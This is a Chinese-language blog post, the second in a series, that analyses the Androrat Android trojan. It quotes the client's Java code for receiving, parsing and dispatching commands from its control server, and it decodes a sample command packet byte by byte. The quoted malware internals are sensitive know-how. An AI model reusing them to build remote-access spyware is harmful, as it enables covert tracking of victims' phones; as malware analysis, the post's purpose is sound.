@@ -1,0 +1,248 @@
+---
+layout: post
+title: "剖析安卓木马Androrat（二）"
+date: 2017-04-09 02:05:34 +0800
+author: tang3
+comments: true
+categories: 技术
+---
+
+## 0x00 前言
+
+上一篇文章我们分析了Androrat这个木马的Client核心代码，这次我们来聊一聊它是如何解析服务端发过来的命令然后执行的。
+
+## 0x01 代码分析
+
+首先我们从上篇文章中提到的onStartCommand函数的这段代码来开始：
+
+```java
+readthread = new Thread(new Runnable() { public void run() { waitInstruction(); } });
+```
+
+起一个线程运行waitInstruction方法，这个方法顾名思义，客户端等待服务端的指令，下面让我们来看一下代码：
+
+```java
+	public void waitInstruction() { //Le thread sera bloqué dedans
+		try {
+			for(;;) {
+				if(stop)
+					break;
+				conn.getInstruction() ;
+			}
+		}
+		catch(Exception e) { 
+			isListening = false;
+			resetConnectionAttempts();
+			reconnectionAttempts();
+			if(waitTrigger) {
+				registerSMSAndCall();
+			}
+		}
+	}
+```
+
+循环执行Connection的getInstruction来接收指令，直到stop成员变量被置为true。如果抛出异常，则尝试重新连接到服务端。下面我们接着来看Connection的getInstruction代码：
+
+```java
+	public ByteBuffer getInstruction() throws Exception
+	{
+		readInstruction = receive.read();
+		
+		if(dem.receive(readInstruction))
+			readInstruction.compact();
+		else
+			readInstruction.clear();
+		
+		return readInstruction;
+	}
+```
+
+读取缓冲区中的数据，然后解码输入数据，判断解码是否成功，最后返回空缓冲区。用于解码输入数据的receive方法的代码如下：
+
+```java
+	public boolean receive(ByteBuffer buffer) throws Exception
+	{
+
+		while (reading) {
+			
+	
+				if(!partialDataExpected)
+					//si on n'attend pas de donn�es partielles(dans le cas d'un paquet pas re�ue enti�rement)
+				{	
+						// si la taille du buffer est insuffisante
+						if ((buffer.limit() - buffer.position()) < Protocol.HEADER_LENGTH_DATA) 
+						{
+							
+							return true;
+						}
+				}
+	
+				// dans le cas d'un paquet partiellement recue
+				if (partialDataExpected)
+					partialDataExpected = p.parseCompleter(buffer);
+				else 
+				{
+					p = new TransportPacket();
+					partialDataExpected = p.parse(buffer);
+				}
+				
+				
+				
+				if (partialDataExpected)
+					return true;
+				else
+					controler.Storage(p, imei);
+			
+		}
+
+
+		reading = true;
+		return true;
+	}
+```
+
+如果数据没有异常，则判断缓冲限制大小减去当前游标所在缓冲位置（即将要读取的数据）是否小于传输协议中包头的长度，如果小于（不符合协议），则返回。后面继续判断数据是否异常，如果存在，则使用TransportPacket类中的parseCompleter方法对数据进行读取操作，并将是否处理成功返回给partialDataExpected变量。如果数据没有异常，则实例化TransportPacket对象，并调用TransportPacket的parse方法对数据进行解析和读取数据body，最终头部信息有一个int作为totalLength、一个int作为localLength、一个byte作为lst、一个short作为NumSeq、一个int作为channel，其余部分作为body存储到一个byte数组当中（后面我们会具体的讲它们各个位的作用）。parse代码如下：
+
+```java
+	public boolean parse(ByteBuffer buffer) throws Exception{
+		
+
+		totalLength = buffer.getInt();
+		localLength = buffer.getInt();
+
+		byte lst = buffer.get();
+		if (lst == 1)
+			last = true;
+		else
+			last = false;
+
+		NumSeq = buffer.getShort();
+		channel = buffer.getInt();
+		/*
+		System.out.println("Taille totale de la donn�e : " + totalLength);
+		System.out.println("Taille des donn�es du paquet : " + localLength);
+		System.out.println("Dernier paquet : " + last);
+		System.out.println("Position du paquet : " + NumSeq);
+		System.out.println("Canal:" + channel);
+		System.out.println("Recuperation de la donnee");
+		*/
+		// si la place restante dans le buffer est insuffisante
+		if ((buffer.limit() - buffer.position()) < localLength) {
+			
+			dataFilling(buffer, buffer.limit() - buffer.position());
+			//System.out.println("une partie du packet a ete sauvegarde");
+			return true;
+			
+		} 
+		else 
+		{
+			// s'il y a assez de place, on sauvegarde tout le paquet
+				data = new byte[localLength];
+				buffer.get(data, 0, data.length);
+				return false;
+			
+		}
+
+	}
+```
+
+我们继续向下看receive最后的代码，判断数据是否异常，如果没有异常则调用controler（即Client）的Storage方法，将刚才处理数据的TransportPacket实例作为参数传递到Storage方法中。下面我们直接来看Storage的代码：
+
+```java
+	public void Storage(TransportPacket p, String i) 
+	{
+		try
+		{
+			packet = new CommandPacket(); //!!!!!!!!!!!! Sinon on peut surement en valeur les arguments des command précédantes !
+			packet.parse(p.getData());
+			
+			Message mess = new Message();
+			Bundle b = new Bundle();
+			b.putShort("command", packet.getCommand());
+			b.putByteArray("arguments", packet.getArguments());
+			b.putInt("chan", packet.getTargetChannel());
+			mess.setData(b);
+			handler.sendMessage(mess);
+		}
+		catch(Exception e)
+		{
+			System.out.println("Androrat.Client.storage : pas une commande");
+		}		
+	}
+```
+
+先实例化一个CommandPacket对象，用它的parese方法解析数据，这回是解析数据的body部分，先看代码：
+
+```java
+	public void parse(ByteBuffer b) {
+		this.commande = b.getShort();
+		this.targetChannel = b.getInt();
+		this.argument = new byte[b.remaining()];
+		b.get(argument, 0, b.remaining());
+	}
+```
+
+取body部分第一个short作为命令，取之后的一个int参数作为channel，剩下的内容作为参数。
+
+然后通过使用Message将内容传递到handler.sendMessage方法中，在这个方法中只有唯一的一个操作，就是调用processCommand处理参数中所带内容。而processCommand方法的操作是，调用在Client中定义的procCmd实例，执行它的process方法，参数顺序为，命令、参数、channel。process方法代码有些长，我们截取部分来看，代码如下：
+
+```java
+public void process(short cmd, byte[] args, int chan)
+	{
+		this.commande = cmd;
+		this.chan = chan;
+		this.arguments = ByteBuffer.wrap(args);
+		
+		if (commande == Protocol.GET_GPS_STREAM)
+		{
+			String provider = new String(arguments.array());
+
+			if (provider.compareTo("network") == 0 || provider.compareTo("gps") == 0) {
+				client.gps = new GPSListener(client, provider, chan);
+				client.sendInformation("Location request received");
+			}
+			else
+				client.sendError("Unknown provider '"+provider+"' for location");
+			
+		}
+		/* 省略部分代码 */
+		else if(commande == Protocol.DISCONNECT) {
+			client.onDestroy();
+		}
+		else {
+			client.sendError("Command: "+commande+" unknown");
+		}
+			
+	}
+```
+
+代码很简单，通过if和else if判断应执行哪一条命令，然后调用其中的具体操作。如果收到断开连接的命令，则调用Client的onDestroy方法来关闭连接。
+
+### 0x02 服务端发送指令格式
+
+我们以读取文件树的指令为例，来看指令结构：
+
+![datahex](/assets/images/2017-04/hexdata.png)
+
+按照上面分析代码的过程，我们可以把指令切割为如下：
+
+```
+totalLength  :00 00 00 07  ==》总共长度，如果分片传递则大于localLength
+localLength  :00 00 00 07  ==》本包长度
+lst          :01           ==》是否为最后一个包
+NumSeq       :00 00        ==》如果是分片，则表示此包为第几个数据包
+channel      :00 00 00 00  ==》服务端所使用的频道
+commande     :00 07        ==》命令
+targetChannel:00 00 03 8f  ==》返回数据发送到的频道
+argument     :2f           ==》执行命令所用到的参数
+```
+
+至于commande（作者拼错了吧？）中各个数值，大家可以到Protocol.java文件中去看，内容太长，我就不在这里贴了。
+
+## 0x03 总结
+
+关于Androrat木马客户端接受服务端指令的过程，我们已经分析完了。除了客户端如何构造数据包，将信息发送至服务端这个功能还值得一说，其他的代码就没什么要说的必要了。下篇文章我打算把构造向服务端发送数据包的代码分析一下，然后再整体的对这个木马的结构进行一下分析，画一下结构图什么的。
+
+至于其他功能性的代码，其实和正常的Android软件开发没什么区别。如果感兴趣，建议大家去看上篇文章提到的那个教程。如果有时间，我也可能会翻译过来。
+
+**从我分析的这个算是比较流行的木马情况来看，恶意软件还是处于刚刚开始的阶段，代码实现方向还是以基础功能性为主，对抗相关的内容很少，或者说是几乎没有。**
